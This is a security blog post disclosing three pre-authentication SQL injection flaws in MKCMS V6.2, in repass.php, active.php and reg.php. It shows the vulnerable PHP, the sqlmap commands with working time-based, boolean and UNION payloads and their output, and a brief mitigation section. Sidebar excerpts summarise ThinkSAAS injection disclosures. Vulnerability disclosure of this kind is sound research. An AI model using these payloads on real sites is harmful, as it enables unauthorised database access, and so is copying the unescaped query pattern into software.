=== Content from unc1e.blogspot.com_3961969f_20250119_130141.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

### MKCMS V6.2 has mutilple vulnerabilities

[四月 11, 2020](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "permanent link")

# 0x00:Lead In

> Source code can be downloaded  at  https://www.lanzous.com/ib7zwmh

This CMS is kinda funny, coz there is a universal filter `addslashes`  in `/system/library.php`
```
/system/library.php
<?php
...
if (!get_magic_quotes_gpc()) {
    if (!empty($_GET)) {
        $_GET = addslashes_deep($_GET);
    }
    if (!empty($_POST)) {
        $_POST = addslashes_deep($_POST);
    }
    $_COOKIE = addslashes_deep($_COOKIE);
    $_REQUEST = addslashes_deep($_REQUEST);
}
function addslashes_deep($_var_0)
{
    if (empty($_var_0)) {
        return $_var_0;
    } else {
        return is_array($_var_0) ? array_map('addslashes_deep', $_var_0) : addslashes($_var_0);
    }_var_0
}
```

While it uses `stripslashes` somewhere by mistake, let's do a global search about it, we get **3 SQL injections**

![image.png](https://cdn.nlark.com/yuque/0/2020/png/166008/1586576676672-8bef147b-e4c1-4e41-951b-38e9cc20e422.png "image.png")
# 0x01:PreAuth SQL injection in /ucenter/repass.php

MKCMS V6.2 has SQL injection via the /ucenter/repass.php *name* parameter.
```
/ucenter/repass.php
<?php
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
$email = trim($_POST['email']);
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_name='$username' and u_email='$email'");
  ...

```

and it can be automated exploited by sqlmap namely
```
sqlmap -u http://localhost/ucenter/repass.php  --data "name=1&email=1@1.com" -p name
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=11' AND (SELECT 7672 FROM (SELECT(SLEEP(5)))NmRk) AND 'VTKx'='VTKx&email=222@222.m&submit=

```

And this can be tracked in 2019 via <https://xz.aliyun.com/t/4189#toc-1>by [CoolCat](https://xz.aliyun.com/u/12470), so CVE request of this vuln won't belong to me, I just wanna enrich the CVE database.

# 0x02:PreAuth SQL injection in /ucenter/active.php

MKCMS V6.2 has SQL injection via the /ucenter/active.php *verify* parameter.
```
/ucenter/active.php
<?php
...
$verify = stripslashes(trim($_GET['verify']));  //去掉了转义用的\
$nowtime = time();
$query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
$row = mysql_fetch_array($query);
...
```

Likewise, attackers can exploit it via sqlmap by typing

```
sqlmap -u http://localhost/ucenter/active.php?verify=1
Parameter: verify (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: verify=1' AND (SELECT 5656 FROM (SELECT(SLEEP(5)))xcPF) AND 'TRJq'='TRJq
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: verify=1' UNION ALL SELECT CONCAT(0x7171786b71,0x706d4e457048744251624653456d554a685a77654c66497a736d704c7454586462716f457a56587a,0x71707a7671)-- WUGv

```

# 0x03:PreAuth SQL injection in /ucenter/reg.php

MKCMS V6.2 has SQL injection via the /ucenter/reg.php *name* parameter.h
```
/ucenter/reg.php
<?php
...
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_name='$username'");
  ...
```

Again, sqlmap can be used to automate the exploitation

```
sqlmap -u http://localhost/ucenter/reg.php  --data "name=1&submit=1@1.com" -p name
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=1' AND 2487=2487 AND 'WOhs'='WOhs&submit=1@1.com
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=1' AND (SELECT 6840 FROM (SELECT(SLEEP(5)))rygh) AND 'eoEE'='eoEE&submit=1@1.com

```

# 0x04:Mitigation

remove the ​`stripslashes()` before the POST/GET param, thus we can't exploit it unless the coding of MYSQL is GBK/GB2312, i.e.*wide byte sql injection.*
(In my opinion,  is there any need to escape the name? it has never been allowed at all !

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 标签

[CVE](https://blog.unc1e.com/search/label/CVE)

标签：
[CVE](https://blog.unc1e.com/search/label/CVE)

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 评论

#### 发表评论

### 此博客中的热门博文

### [Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html)

[十二月 03, 2020](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "permanent link")

1. Intro of this CMS The repo of ThinksaasS is located at https://github.com/thinksaas/ThinkSAAS , quite a common-used CMS. Source code of v3.38  could be downloaded at https://www.thinksaas.cn/service/down/ , while passcode of downlaoding is thinksaas9999 of this Vuln ThinkSAAS before 3.38 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter, allowing remote attackers to execute arbitrary SQL commands. 2. Walkthrough Code Review Risky lines are here =>   https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/app/topic/action/admin/topic.php#L42 https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/thinksaas/tsApp.php#L146 Due to unproper conjunction of SQL query sentences (1) and invalid filter (2) (1) unproper conjunction of SQL query sentences app/topic/action/admin/topic.php#L42 Let's see how findAll() works: thinksaas/tsApp.p...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[4 条评论](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html#comments)

[阅读全文](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php")

### [ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html)

[七月 31, 2021](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "permanent link")

  0x01 Summay In last December last year, there were security problems caused by improper URLDecode. Reference https://github.com/thinksaas/ThinkSAAS/issues/24 To sum up, it is in ThinkSAAS-master\app\topic\action\admin\topic.php , improper filtering of keyword parameters leads to SQL injection. In last year's fix plan (click Here Direct), the first is $title Changed $kw Variable, And, after tsFilter Function filtering. However, there are still security risks now. # Responsible Vulnerability Disclosure info Title: ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php Desc: ThinkSAAS before 3.52 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter（need the privilege of admin）, allowing logged attackers to execute arbitrary SQL commands. This is a bypass of CVE-2020-35337. CVSS v3.1 Vector: - 7.5 AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[1 条评论](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html#comments)

[阅读全文](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)


